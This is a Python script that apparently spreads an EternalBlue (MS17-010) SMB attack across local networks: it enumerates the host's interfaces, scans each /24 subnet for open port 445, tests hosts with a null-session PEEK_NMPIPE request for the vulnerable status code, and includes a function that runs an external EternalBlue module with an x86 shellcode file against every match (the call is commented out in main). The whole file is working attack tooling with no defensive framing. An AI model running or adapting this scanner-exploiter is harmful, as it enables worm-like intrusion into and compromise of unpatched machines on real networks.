#!/usr/bin/python
import gevent
from gevent import socket
from libs.mysmb import MYSMB
from struct import pack
from netaddr import IPNetwork
from libs import eternal
import netifaces as ni
import fcntl

def get_ip(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,
        pack('256s', ifname[:15])
    )[20:24])


def ret_ip():
    if_list = ni.interfaces()
    ips = []

    for iface in if_list:
        try:
            ip = get_ip(str(iface))
            if '127.0.0.1' not in ip:
                ips.append(ip)
        except:
            pass
    return ips

def scan(ip):
    ip = str(ip)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        r = s.connect_ex((ip, 445))
        if r == 0:
            TargetList.append(ip)
    except:
        pass
    s.close()

def threading(ip):
    jobs = [gevent.spawn(scan, i) for i in IPNetwork(ip+"/24")]
    gevent.joinall(jobs, timeout=int(1))

def exploit(targets):
    for i in targets:
        eternal.autoRun(i,"sc_x86.bin")

def check(open_smb):
    vulnerable_smb = []
    for target in open_smb:
        if '172.16.65.2' not in target:
            try:
                conn = MYSMB(target)
                conn.login('', '')
                tid = conn.tree_connect_andx('\\\\' + target + '\\' + 'IPC$')
                conn.set_default_tid(tid)

                TRANS_PEEK_NMPIPE = 0x23
                recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE),
                        maxParameterCount=0xffff, maxDataCount=0x800)
                if recvPkt.getNTStatus() == 0xC0000205:
                    vulnerable_smb.append(target)
                    conn.disconnect_tree(tid)
                    conn.logoff()
                    conn.get_socket().close()
            except:
                pass

    return vulnerable_smb

if __name__ == '__main__':
    TargetList = []
    print(ret_ip())
    for ip in ret_ip():
    	threading(ip)
    targets = check(TargetList)
    print(targets)
    #exploit(targets)
